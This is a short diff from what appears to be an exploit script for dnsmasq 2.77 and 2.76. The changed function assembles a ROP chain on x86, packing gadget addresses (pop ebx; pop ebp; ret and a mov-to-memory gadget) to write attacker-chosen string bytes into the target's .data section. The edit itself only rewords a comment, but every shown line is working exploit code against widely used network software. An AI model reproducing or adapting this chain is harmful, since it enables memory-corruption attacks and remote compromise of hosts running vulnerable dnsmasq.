@@ -199,7 +199,7 @@ def add_string_in_data(addr_in_data, string):
                 rop_chain += Base.pack32(addr_in_data - 1 + x)  # address in .data - 1
                 rop_chain += Base.pack32(POP_EBX_EBP_277x86)    # pop ebx; pop ebp; ret
                 rop_chain += string[x:x + 4]                    # 4 byte of string
-                rop_chain += Base.pack32(DATA_277x86 + 28)      # 0x0808c054 + 28
+                rop_chain += Base.pack32(DATA_277x86 + 28)      # address of .data + 28
                 rop_chain += Base.pack32(MOV_EAX_EBX_277x86)    # mov [eax+0x1],ebx; add cl,cl; ret
 
         if dnsmasq_version == "2.76":
